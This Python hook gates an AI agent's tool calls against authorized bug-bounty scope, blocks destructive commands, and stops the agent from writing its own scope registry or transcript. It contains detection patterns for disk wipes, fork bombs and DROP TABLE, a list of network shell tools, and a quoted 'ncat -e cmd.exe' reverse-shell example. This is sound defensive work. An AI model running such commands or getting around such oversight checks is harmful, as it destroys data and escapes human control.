#!/usr/bin/env python3
"""
scope_gate_v2.py - PreToolUse hook (extraccion por contexto).

POR QUE EXISTE
    La v1 corria DOMAIN_RE sobre TODO el texto. Eso convierte en "dominio"
    cualquier identificador con punto (json.loads, urllib.request, re.findall,
    obj.get, tempfile.mkdtemp) y cualquier archivo con extension no listada
    (release-2.ovpn, 4.ovpn). Resultado medido en gate.log: 256 force_ask
    contra 20 allow. El gate se vuelve ruido y el operador aprende a ignorarlo,
    que es peor que no tener gate.

QUE CAMBIA
    Solo se extraen candidatos de contextos donde de verdad hay un target:
      1. URL            https://host/...
      2. herramienta    nmap|curl|ping|Test-Connection|Invoke-WebRequest|...
      3. flag de host   -Host / -ComputerName / -Uri / -Url / -Server / -Target
    search_web solo mira URLs (buscar un dominio NO toca ese dominio).
    read_url_content mira la URL.
    ask_permission se mantiene estricto (poco volumen, mejor pecar de cauto).

    IPs: se ignoran las privadas / loopback / link-local por defecto (son ruido
    de lab/VPN). Con ANTIGRAVITY_GATE_PRIVATE_IPS=1 se vuelven a gatear.

LO QUE NO CAMBIA
    Un target real fuera de scope sigue dando force_ask. El registro, el match,
    los CATASTROPHIC y la proteccion de rutas de persistencia son identicos.
"""
import base64
import hashlib
import ipaddress
import json
import os
import re
import shlex
import sys
from datetime import datetime, timezone

HOME = os.path.expanduser("~")
HOOKS = os.path.join(HOME, ".gemini", "config", "hooks")
for _p in (os.path.dirname(os.path.abspath(__file__)), HOOKS):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from scope_store import auto_capture, load_programs, match_target  # noqa: E402

# Las rutas de estado se pueden mover por entorno para que la matriz de tests
# corra el gate INSTALADO sin escribir en el directorio vivo (si no, los hosts
# de prueba acabarian en pending.json, la cola que el operador revisa).
STATE = (os.environ.get("ANTIGRAVITY_STATE_DIR")
         or os.path.join(HOME, ".gemini", "config", ".hook_state"))
LOG = os.environ.get("BTG_LOG_FILE") or os.path.join(STATE, "gate-v2.log")

# El gate dice que copia de si mismo esta corriendo: --whoami imprime ruta y
# sha256, y cada linea del log lleva el prefijo del hash. Asi "el fix no se
# aplico" se responde desde el gate y no re-hasheando archivos a mano.
GATE_PATH = os.path.abspath(__file__)


def _self_hash():
    try:
        with open(GATE_PATH, "rb") as handle:
            return hashlib.sha256(handle.read()).hexdigest()
    except Exception:
        return "unknown"


GATE_HASH = _self_hash()

CATASTROPHIC = [
    # El target puede seguir dentro de una cadena (cd /tmp && rm -rf / && echo
    # done): se exige que termine el TARGET, no el comando entero.
    (r"\brm\s+-[a-z]*[rf][a-z]*\s+(?:--no-preserve-root\s+)?"
     r"(?:~/\*|~/|\$HOME/\*|\$HOME|%USERPROFILE%|/\*|/|\*|~)(?=\s|$|[;&|])",
     "borrado recursivo de raiz/home"),
    (r"\bRemove-Item\b.*-Recurse.*\b(?:C:\\|C:/)(?=\s|$|[;&|])", "borrado recursivo de C:\\"),
    # Windows escribe lo mismo como rd /s /q C:\ y del /s C:\*.
    (r"\b(?:rd|rmdir)\s+/s(?:\s+/q)?\s+[\"']?[A-Za-z]:\\+[\"']?(?=\s|$|[;&|])",
     "borrado recursivo de la raiz de un disco"),
    (r"\bdel\s+(?:/[a-z]\s+)*[\"']?[A-Za-z]:\\+\*", "borrado recursivo de la raiz de un disco"),
    (r"\bFormat-Volume\b|\bformat\s+[a-z]:", "formateo de volumen"),
    (r"\bdd\s+if=.*\bof=/dev/(sd|nvme)", "escritura cruda sobre disco"),
    (r":\(\)\s*\{\s*:\|:&\s*\};:", "fork bomb"),
    (r"\bDROP\s+(TABLE|DATABASE|SCHEMA)\b", "destruccion de base de datos"),
    (r"\bmkfs\.", "formateo de filesystem"),
]

# ---------------------------------------------------------------------------
# Chequeo por argv canonico. Las regex pierden contra flags largos, reordenados,
# comillas, `--` y expansion de variables: `rm -r -f /`, `rm --recursive --force
# /`, `rm -rf "$HOME"` y `rm -rf -- /` son el mismo comando escrito distinto.
# Se normaliza cada segmento con shlex y se juzga el argv resultante.
# ---------------------------------------------------------------------------
_HOME_NORM = os.path.normpath(HOME).replace("\\", "/").lower().rstrip("/") or "/"

_DANGER_TARGETS = {
    "/", "/*", "*", "~", _HOME_NORM, _HOME_NORM + "/*",
    "c:", "c:/*", "d:", "d:/*", "e:", "e:/*", "f:", "f:/*",
}


def _norm_target(token):
    value = (token or "").strip().strip("\"'")
    value = os.path.expanduser(value)
    for marker in ("${HOME}", "$HOME", "%USERPROFILE%",
                   "%HOMEDRIVE%%HOMEPATH%", "~"):
        value = value.replace(marker, HOME)
    value = value.replace("\\", "/")
    while "//" in value[1:]:
        value = value.replace("//", "/", 1)
    value = value.rstrip("/") or "/"
    return value.lower()


def _danger_target(token):
    value = _norm_target(token)
    return value in _DANGER_TARGETS or value.endswith(":/*")


def _segment_argv(text):
    for segment in re.split(r"&&|\|\||[;|\n]", text):
        segment = segment.strip()
        if not segment:
            continue
        try:
            argv = shlex.split(segment, posix=True)
        except ValueError:
            argv = segment.split()
        if argv:
            yield argv


def destructive_argv_reason(text):
    """Deny recursive deletion / disk wipes written in any equivalent form."""
    for argv in _segment_argv(text):
        program = os.path.basename(argv[0]).lower()
        if program.endswith(".exe"):
            program = program[:-4]
        args = argv[1:]

        if program == "rm":
            flags = [a for a in args if a.startswith("-")]
            targets = [a for a in args if not a.startswith("-")]
            recursive = any(
                f in ("-r", "-R", "--recursive")
                or (not f.startswith("--") and ("r" in f or "R" in f))
                for f in flags
            )
            if recursive and any(_danger_target(t) for t in targets):
                return "borrado recursivo de raiz/home"

        if program in ("rd", "rmdir"):
            flags = [a.lower() for a in args if a.startswith("/")]
            targets = [a for a in args if not a.startswith("/")]
            if "/s" in flags and any(_danger_target(t) for t in targets):
                return "borrado recursivo de la raiz de un disco"

        if program in ("del", "erase"):
            flags = [a.lower() for a in args if a.startswith("/")]
            targets = [a for a in args if not a.startswith("/")]
            if "/s" in flags and any(
                    _danger_target(t) or _norm_target(t).endswith("/*")
                    for t in targets):
                return "borrado recursivo de la raiz de un disco"

        if program in ("remove-item", "ri", "rm-item"):
            flags = [a.lower() for a in args if a.startswith("-")]
            targets = [a for a in args if not a.startswith("-")]
            recursive = any(
                f == "-recurse" or f.startswith("-recurse") for f in flags)
            if recursive and any(_danger_target(t) for t in targets):
                return "borrado recursivo de C:\\"

        joined = " ".join(argv).lower()
        if re.search(r"\bdd\b.*\bof=/dev/(?:sd|nvme|hd|vd)", joined):
            return "escritura cruda sobre disco"
        if re.search(r"\bmkfs(?:\.\w+)?\b", joined):
            return "formateo de filesystem"
        if re.search(r"\bformat\s+[a-z]:", joined):
            return "formateo de volumen"
        if ":(){ :|:& };:" in joined:
            return "fork bomb"
        if re.search(r"\bdrop\s+(?:table|database|schema)\b", joined):
            return "destruccion de base de datos"
    return ""

# Un push forzado reescribe la historia del remoto y no tiene vuelta atras
# limpia. Es raro, asi que preguntar no cuesta friccion. --force-with-lease y
# --force-if-includes son la forma segura y pasan.
#
# git -C <dir> push y la forma +refspec son la misma reescritura escrita de otra
# manera, asi que tambien cuentan.
FORCE_PUSH = re.compile(
    r"\bgit(?:\s+-[Cc]\s+[^\s;|&]+)*\s+push\b[^|;&\n]*"
    r"(?:--force(?!-(?:with-lease|if-includes))|\s-f(?![\w-])|\s\+[^\s;|&]+)",
    re.I,
)

# powershell -enc <base64> esconde el comando de todo regex. Se decodifica (es
# UTF-16LE, lo que acepta -EncodedCommand) y se juzga el texto que de verdad
# ejecuta.
_ENCODED_PS = re.compile(
    r"(?:-|/)(?:e|ec|enc|enco|encod|encode|encoded|encodedcommand)\s+([A-Za-z0-9+/=]{16,})",
    re.I,
)


def decode_wrapped(text: str) -> str:
    if not re.search(r"powershell|pwsh", text, re.I):
        return ""
    pieces = []
    for match in _ENCODED_PS.finditer(text):
        chunk = match.group(1)
        try:
            raw = base64.b64decode(chunk + "=" * (-len(chunk) % 4))
        except Exception:
            continue
        for codec in ("utf-16-le", "utf-8"):
            try:
                decoded = raw.decode(codec)
            except UnicodeDecodeError:
                continue
            if all(ch.isprintable() or ch.isspace() for ch in decoded):
                pieces.append(decoded)
                break
    return " ".join(pieces)


# Una tool que el gate no conoce igual puede llevar un host.
URL_ARG = re.compile(r"^(?:url|uri|link|href|target_?url|url_or_path)$", re.I)

# force_ask = pregunta SIEMPRE (ignora "Always Allow").
# ask       = pregunta pero respeta "Always Allow" del runtime (menos friccion).
# Solo se permiten esos dos: nunca "allow"/"deny" por variable de entorno.
_OUT = os.environ.get("ANTIGRAVITY_GATE_OUT_OF_SCOPE", "force_ask")
OUT_OF_SCOPE_DECISION = _OUT if _OUT in ("force_ask", "ask") else "force_ask"
GATE_PRIVATE_IPS = os.environ.get("ANTIGRAVITY_GATE_PRIVATE_IPS") == "1"
PENDING = os.path.join(STATE, "pending.json")

NOISE = {"localhost", "127.0.0.1", "0.0.0.0", "schemas.android.com",
         "w3.org", "json-schema.org", "github.com", "pypi.org", "npmjs.com",
         "python.org", "microsoft.com", "google.com", "gstatic.com",
         "antigravity.google", "accounts.google.com", "oauth2.googleapis.com",
         "cloudcode-pa.googleapis.com", "raw.githubusercontent.com"}

# Referencias (docs, social, registries) que nunca son target. Lista EXPLICITA
# del operador en noise.json. No se aprende del trafico del agente: un auto-scope
# que autoriza lo que el agente toca es, en la practica, apagar el gate.
NOISE_FILE = (os.environ.get("ANTIGRAVITY_GATE_NOISE")
              or os.path.join(HOOKS, "noise.json"))


def _load_noise():
    extra = set()
    try:
        with open(NOISE_FILE, "r", encoding="utf-8-sig") as f:
            data = json.load(f)
        if isinstance(data, list):
            extra = {str(x).strip().lower() for x in data if str(x).strip()}
    except Exception:
        pass
    return NOISE | extra


NOISE_SET = _load_noise()

EXT_RE = re.compile(
    r"\.(py|js|ts|jsx|tsx|json|md|txt|log|exe|dll|so|yaml|yml|toml|sh|ps1|"
    r"php|asp|aspx|jsp|html?|css|pdf|png|jpe?g|zip|ovpn|conf|cfg|ini|env|"
    r"bat|cmd|pem|crt|cer|key|p12|pfx|jks|der|csr|zip|7z|rar|tar|gz|"
    r"db|sql|pcap|cap|csv|xml|map|lock)$", re.I)

# token de target: IPv4 o dominio
_TOKEN = r"((?:\d{1,3}\.){3}\d{1,3}|(?:[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?\.)+[a-z]{2,24})"

URL_HOST_RE = re.compile(r"https?://([^/\s:'\"<>)\]]+)", re.I)
NET_TOOL_RE = re.compile(
    r"\b(?:nmap|masscan|curl|wget|ping|ping6|tracert|traceroute|nslookup|dig|"
    r"host|whois|scp|sftp|ftp|nc|ncat|netcat|telnet|"
    r"Test-Connection|Test-NetConnection|Resolve-DnsName|"
    r"Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b", re.I)


def _net_targets(text):
    """Hosts nombrados en cualquier parte despues de una tool de red, en su
    segmento. El matcher viejo exigia que el host fuera el primer argumento
    suelto, asi que `ncat -e cmd.exe evil.example 4444` se colaba: cmd.exe
    venia primero y se descartaba por ser un nombre de archivo. Una tool de
    red convierte el resto de su segmento en contexto de red; los nombres de
    archivo igual los filtra _keep."""
    found = set()
    for match in NET_TOOL_RE.finditer(text):
        segment = re.split(r"[;&|\n]", text[match.end():], maxsplit=1)[0]
        for token in re.finditer(_TOKEN, segment, re.I):
            found.add(token.group(1).lower())
    return found
HOST_FLAG_RE = re.compile(
    r"-(?:Host|ComputerName|Uri|Url|Server|Target|Address)\s+[\"']?" + _TOKEN,
    re.I)

SSH_TOOL_RE = re.compile(r"(?<![\w.-])ssh(?=\s)", re.I)
SSH_VALUE_OPTIONS = {
    "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L",
    "-l", "-m", "-O", "-o", "-p", "-Q", "-R", "-S", "-W", "-w",
}


def _ssh_targets(text):
    """Extrae destinos SSH, incluidos user@host, sin leer identificadores de código."""
    targets = set()
    for match in SSH_TOOL_RE.finditer(text):
        tail = re.split(r"[\r\n;|&]", text[match.end():], maxsplit=1)[0]

        # Opciones cuyo valor es, o contiene, un host: -J (jump), -L/-R/-D
        # (port forwarding) y ProxyJump/ProxyCommand. El host viaja dentro del
        # valor y no como destino final, asi que el parseo posicional lo pierde.
        for option in re.finditer(
                r"(?:-J\s*|-[LRD]\s*)(\"[^\"]*\"|'[^']*'|[^\s]+)", tail):
            value = option.group(1).strip("\"'")
            for token in re.finditer(_TOKEN, value, re.I):
                targets.add(token.group(1).lower())
        for option in re.finditer(
                r"(?:ProxyJump|ProxyCommand)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s]+)",
                tail, re.I):
            value = option.group(1).strip("\"'")
            for token in re.finditer(_TOKEN, value, re.I):
                targets.add(token.group(1).lower())

        try:
            args = shlex.split(tail)
        except ValueError:
            continue

        index = 0
        while index < len(args):
            arg = args[index]
            if arg == "--":
                index += 1
                break
            if not arg.startswith("-") or arg == "-":
                break

            option = arg.split("=", 1)[0]
            if option in SSH_VALUE_OPTIONS:
                index += 1 if "=" in arg else 2
            elif len(arg) > 2 and arg[:2] in SSH_VALUE_OPTIONS:
                index += 1
            else:
                index += 1

        if index < len(args):
            destination = args[index].rsplit("@", 1)[-1]
            token = re.search(_TOKEN, destination, re.I)
            if token:
                targets.add(token.group(1).lower())
    return targets
CMD_TOOLS = {"run_command": "CommandLine", "manage_task": "Input"}
TARGET_TEXT_TOOLS = {"read_url_content": "Url", "search_web": "query",
                     "ask_permission": "Target"}
WRITE_TOOLS = {"write_to_file": "TargetFile",
               "replace_file_content": "TargetFile",
               "multi_replace_file_content": "TargetFile"}

PROTECTED_PATH_RE = re.compile(
    r"(?:"
    r"/\.agents/hooks\.json$"
    r"|/\.gemini/config/hooks\.json$"
    r"|/\.gemini/config/hooks/"
    r"|/\.gemini/config/agents/"
    # El registro de alcance y el estado del gate: si el agente los escribe,
    # se autoriza solo. Es la cadena que hay que cerrar primero.
    r"|/\.gemini/config/engagements/"
    r"|/\.gemini/config/\.hook_state/"
    # Transcripts, tareas y logs que Antigravity genera: auto_capture los lee
    # como si fueran la voz del usuario.
    r"|/\.gemini/antigravity/brain/[^/]+/\.system_generated/"
    r"|/\.gemini/oauth_creds\.json$"
    r"|/\.gemini/mcp-oauth-tokens\.json$"
    r"|/\.git/hooks/"
    r"|/(?:\.bashrc|\.bash_profile|\.zshrc|\.profile|\.bash_login)$"
    r"|/microsoft\.powershell_profile\.ps1$"
    r"|/start menu/programs/startup/"
    r"|/\.claude/settings\.json$"
    r")", re.I)

# Estos no se preguntan: el agente no tiene por que escribir el registro ni
# el transcript que el gate consume. La edicion manual sigue disponible.
HARD_DENY_PATH_RE = re.compile(
    r"(?:"
    r"/\.gemini/config/engagements/"
    r"|/\.gemini/antigravity/brain/[^/]+/\.system_generated/"
    r")", re.I)

WRITE_PATH_KEYS = ("TargetFile", "Target", "path", "file_path",
                   "AbsolutePath", "File", "filePath")

LOG_MAX_BYTES = 2 * 1024 * 1024

# El log es un archivo de texto que el operador comparte y revisa. Un comando
# con `-H "Authorization: Bearer ..."`, `-u user:pass`, `--password` o un token
# en query string no puede quedar ahi en claro.
SECRET_RE = re.compile(
    r"(?i)("
    r"authorization\s*:\s*(?:bearer|basic)\s+[^\s'\"]+"
    r"|(?:access[_-]?token|refresh[_-]?token|id[_-]?token|token|password|"
    r"passwd|pwd|api[_-]?key|apikey|secret|client[_-]?secret)\s*[=:]\s*"
    r"[^\s'\"&]+"
    r"|--password(?:=|\s+)[^\s'\"]+"
    r"|-u\s+[^\s:]+:[^\s'\"]+"
    r"|://[^/\s:@]+:[^/\s@]+@"
    r")"
)


def _redact_match(match):
    value = match.group(0)
    if "://" in value:
        return re.sub(r"://[^/@]+@", "://***@", value)
    if value.lower().startswith("authorization"):
        return value.split(":", 1)[0] + ": ***"
    if "=" in value:
        return value.split("=", 1)[0] + "=***"
    return value.split()[0] + " ***"


def redact(text):
    if not isinstance(text, str):
        return text
    return SECRET_RE.sub(_redact_match, text)


def _redact_obj(value):
    if isinstance(value, str):
        return redact(value)
    if isinstance(value, dict):
        return {key: _redact_obj(item) for key, item in value.items()}
    if isinstance(value, list):
        return [_redact_obj(item) for item in value]
    return value


def log(entry):
    try:
        os.makedirs(STATE, exist_ok=True)
        if os.path.exists(LOG) and os.path.getsize(LOG) > LOG_MAX_BYTES:
            os.replace(LOG, LOG + ".1")
        entry = _redact_obj(entry)
        entry["ts"] = datetime.now(timezone.utc).isoformat()
        entry.setdefault("gate", GATE_HASH[:12])
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=True) + "\n")
    except Exception:
        pass


def record_pending(targets, text):
    """Cola de targets vistos fuera de scope, para revisar y autorizar en bloque."""
    try:
        os.makedirs(STATE, exist_ok=True)
        try:
            with open(PENDING, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}
        now = datetime.now(timezone.utc).isoformat()
        for t in targets:
            e = data.get(t) or {"count": 0}
            e["count"] = e.get("count", 0) + 1
            e["last"] = now
            e["sample"] = redact(text[:200])
            data[t] = e
        with open(PENDING, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=True)
    except Exception:
        pass


def _host_from_url(raw):
    h = raw.rsplit("@", 1)[-1]
    h = h.split(":")[0]
    return h.strip(".").lower()


def _is_private(host):
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    return ip.is_private or ip.is_loopback or ip.is_link_local


def _is_noise(host):
    return host in NOISE_SET or any(host.endswith("." + n) for n in NOISE_SET)


def _keep(host):
    if not host:
        return False
    if EXT_RE.search(host):
        return False
    if _is_noise(host):
        return False
    if _is_private(host) and not GATE_PRIVATE_IPS:
        return False
    return True


def extract_targets(text, is_cmd, tool):
    """Candidatos a target, solo desde contextos de red."""
    out = set()
    for m in URL_HOST_RE.finditer(text):
        out.add(_host_from_url(m.group(1)))

    if tool == "ask_permission":
        # Poco volumen y es literalmente "a que me autorizas": estricto.
        for m in re.finditer(_TOKEN, text, re.I):
            out.add(m.group(1).lower())
    elif is_cmd:
        out.update(_ssh_targets(text))
        out.update(_net_targets(text))
        for m in HOST_FLAG_RE.finditer(text):
            out.add(m.group(1).lower())

    return {h for h in out if _keep(h)}


def _write_path(args, name):
    for key in (WRITE_TOOLS.get(name),) + WRITE_PATH_KEYS:
        value = args.get(key) if key else None
        if isinstance(value, str) and value.strip():
            return value
    return ""


def decide_write(args, name):
    raw = _write_path(args, name)
    # Las rutas de las tools suelen ser relativas al workspace: se normaliza a
    # absoluta para que ".agents/hooks.json" quede protegido igual que su forma
    # absoluta (realpath tambien resuelve symlinks).
    path = ""
    if isinstance(raw, str) and raw.strip():
        path = os.path.realpath(
            os.path.abspath(os.path.expanduser(raw))).replace("\\", "/")
    if not path:
        print(json.dumps({"decision": "allow"}))
        return
    if HARD_DENY_PATH_RE.search(path):
        log({"event": "deny-write", "tool": name, "path": path})
        print(json.dumps({
            "decision": "deny",
            "reason": ("%s intenta escribir en %s, que es el registro de alcance "
                       "o el transcript que el gate consume. El agente no puede "
                       "autorizarse solo. Editalo a mano o usa scope_add.py."
                       % (name, path)),
        }))
        return
    if PROTECTED_PATH_RE.search(path):
        log({"event": "protected-write", "tool": name, "path": path})
        print(json.dumps({
            "decision": "force_ask",
            "reason": ("%s intenta escribir en %s, un punto de persistencia: lo "
                       "que quede ahi se ejecuta solo despues (hook config, git "
                       "hooks, perfil de shell). Aproba solo si es tu edicion."
                       % (name, path)),
        }))
        return
    log({"event": "write", "tool": name, "path": path})
    print(json.dumps({"decision": "allow"}))


def read_stdin():
    """Lee el payload tolerando el BOM de UTF-8.

    sys.stdin.read() decodifica con el codec locale: en Windows es cp1252, y el
    BOM UTF-8 que Windows PowerShell 5.1 antepone al pipe se convierte en
    "ï»¿"; el JSON no parsea y el gate falla abierto a allow.
    """
    data = sys.stdin.buffer.read()
    try:
        return data.decode("utf-8-sig")
    except UnicodeDecodeError:
        return data.decode(sys.stdin.encoding or "utf-8", "replace")


def main():
    if "--whoami" in sys.argv:
        print(json.dumps({"gate": GATE_PATH, "sha256": GATE_HASH,
                          "pinned": os.path.basename(GATE_PATH)}))
        return
    raw = read_stdin()
    if not raw.strip():
        print(json.dumps({"decision": "allow"}))
        return
    payload = json.loads(raw)
    call = payload.get("toolCall") or {}
    name = call.get("name", "")
    args = call.get("args") or {}

    if name in WRITE_TOOLS:
        decide_write(args, name)
        return

    if name in CMD_TOOLS:
        text = args.get(CMD_TOOLS[name]) or ""
        is_cmd = True
    elif name in TARGET_TEXT_TOOLS:
        text = args.get(TARGET_TEXT_TOOLS[name]) or ""
        is_cmd = False
    else:
        # Una tool desconocida (browser_navigate, la de un plugin) igual puede
        # llevar un host: se juzgan los argumentos con nombre de URL en vez de
        # dejar que un nombre no reconocido pase por al lado del scope.
        addresses = [
            value for key, value in args.items()
            if isinstance(value, str) and URL_ARG.match(key)
        ]
        if not addresses:
            print(json.dumps({"decision": "allow"}))
            return
        text = " ".join(addresses)
        is_cmd = False

    if not text or not isinstance(text, str):
        print(json.dumps({"decision": "allow"}))
        return

    if is_cmd:
        wrapped = decode_wrapped(text)
        if wrapped:
            log({"event": "unwrapped", "text": wrapped[:400]})
            text = text + "\n" + wrapped

    log({"event": "pre", "tool": name, "text": text,
         "cid": payload.get("conversationId")})

    if is_cmd:
        why = destructive_argv_reason(text)
        if why:
            log({"event": "deny", "why": why, "text": text})
            print(json.dumps({
                "decision": "deny",
                "reason": "Bloqueado por scope_gate: " + why + ". Si es "
                          "intencional, corre el comando a mano fuera del agente.",
            }))
            return
        for pattern, why in CATASTROPHIC:
            if re.search(pattern, text, re.I):
                log({"event": "deny", "why": why, "text": text})
                print(json.dumps({
                    "decision": "deny",
                    "reason": "Bloqueado por scope_gate: " + why + ". Si es "
                              "intencional, corre el comando a mano fuera del "
                              "agente.",
                }))
                return
        m = FORCE_PUSH.search(text)
        if m:
            log({"event": "force_push", "text": text})
            print(json.dumps({
                "decision": "force_ask",
                "reason": ("git push forzado (" + m.group(0).strip() +
                           "): reescribe la historia del remoto y no se deshace "
                           "solo. Con remoto compartido: --force-with-lease."),
            }))
            return

    # Auto-captura APAGADA por defecto. El transcript es un archivo que el
    # agente puede escribir; leerlo como si fuera el usuario convierte una
    # escritura en una autorizacion. Se enciende solo con BTG_AUTO_CAPTURE=1.
    if os.environ.get("BTG_AUTO_CAPTURE") == "1" and payload.get("transcriptPath"):
        try:
            for slug in auto_capture(payload["transcriptPath"]):
                log({"event": "capture", "slug": slug})
        except Exception as exc:
            log({"event": "capture-error", "error": repr(exc)})

    programs = load_programs()
    if not programs:
        log({"event": "warn", "why": "registro vacio", "text": text})
        if os.environ.get("BTG_ALLOW_EMPTY") == "1":
            print(json.dumps({
                "decision": "allow",
                "reason": "Sin programas registrados y BTG_ALLOW_EMPTY=1. "
                          "Este comando pasa sin validar.",
            }))
            return
        print(json.dumps({
            "decision": "force_ask",
            "reason": ("Sin programas registrados: el gate no tiene contra que "
                       "validar. Agrega un programa (scope_add.py o "
                       "engagements/programs/<slug>.md) o define BTG_ALLOW_EMPTY=1 "
                       "para aceptar el riesgo."),
        }))
        return

    candidates = extract_targets(text, is_cmd, name)
    if not candidates:
        log({"event": "allow", "tool": name, "targets": []})
        print(json.dumps({"decision": "allow", "reason": "sin targets de red en el texto"}))
        return

    problems = []
    for target in sorted(candidates):
        res = match_target(target)
        if res["authorized"]:
            log({"event": "authorized", "target": target, "by": res["authorized"]})
            continue
        if res["excluded"]:
            problems.append("%s excluido explicitamente en %s"
                            % (target, ", ".join(res["excluded"])))
        elif res["expired"]:
            problems.append("%s: el alcance de %s vencio"
                            % (target, ", ".join(res["expired"])))
        else:
            problems.append("%s sin programa que lo autorice" % target)

    if problems:
        record_pending(sorted(candidates), text)
        log({"event": "ask", "problems": problems, "text": text})
        print(json.dumps({
            "decision": OUT_OF_SCOPE_DECISION,
            "reason": ("Sin autorizacion vigente: " + "; ".join(problems) +
                       ". Programas cargados: " +
                       ", ".join(p["slug"] for p in programs) +
                       ". Para autorizar un host: echo <host> | python scope_add.py. "
                       "Si es una referencia (docs/social), agregalo a noise.json."),
        }))
        return

    log({"event": "allow", "tool": name, "targets": sorted(candidates)})
    print(json.dumps({"decision": "allow", "reason": "target in-scope"}))


def run():
    try:
        main()
    except Exception as exc:
        log({"event": "error", "error": repr(exc)})
        # Fail-open por defecto para no brickear el agente; BTG_FAIL_CLOSED=1
        # cambia el error a una pregunta, para quien prefiera el otro tradeoff.
        decision = "force_ask" if os.environ.get("BTG_FAIL_CLOSED") == "1" else "allow"
        print(json.dumps({
            "decision": decision,
            "reason": "scope_gate error (%s): revisa el log" % decision,
        }))


if __name__ == "__main__":
    run()
